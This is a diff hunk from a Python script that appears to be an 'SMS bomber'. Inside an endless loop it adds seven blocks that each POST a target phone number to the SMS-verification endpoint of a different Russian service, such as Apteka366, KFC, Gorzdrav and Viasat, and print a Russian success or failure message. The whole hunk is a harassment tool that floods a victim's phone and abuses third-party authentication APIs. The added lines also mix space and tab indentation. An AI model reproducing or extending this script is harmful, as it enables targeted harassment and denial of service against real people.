@@ -321,6 +321,42 @@ while True:
 		print('[+] Delivery отправлено!')
 	except:
 		print('[-] Не отправлено!')
+    try:
+		requests.post('https://apteka366.ru/login/register/sms/send', data={'phone': _phone})
+		print('[+] Apteka366 отправлено!')
+	except:
+		print('[-] Не отправлено!')
+    try:
+		requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'phone': _phone})
+		print('[+] Druqvokruq отправлено!')
+	except:
+		print('[-] Не отправлено!')
+    try:
+		requests.post('https://api.ennergiia.com/auth/api/development/lor', data={'phone': _phone})
+		print('[+] Ennerqiia отправлено!')
+	except:
+		print('[-] Не отправлено!')
+    try:
+		requests.post('http://service.matreshcar.ru/profile/smstoken', data={'phone': _phone})
+		print('[+] Matreshcar отправлено!')
+	except:
+		print('[-] Не отправлено!')
+    try:
+		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={'phone': _phone})
+		print('[+] KFC отправлено!')
+	except:
+		print('[-] Не отправлено!')
+    try:
+		requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phone})
+		print('[+] Qorzdrav отправлено!')
+	except:
+		print('[-] Не отправлено!')
+    try:
+		requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data={'phone': _phone})
+		print('[+] Viasat отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
 
 
 
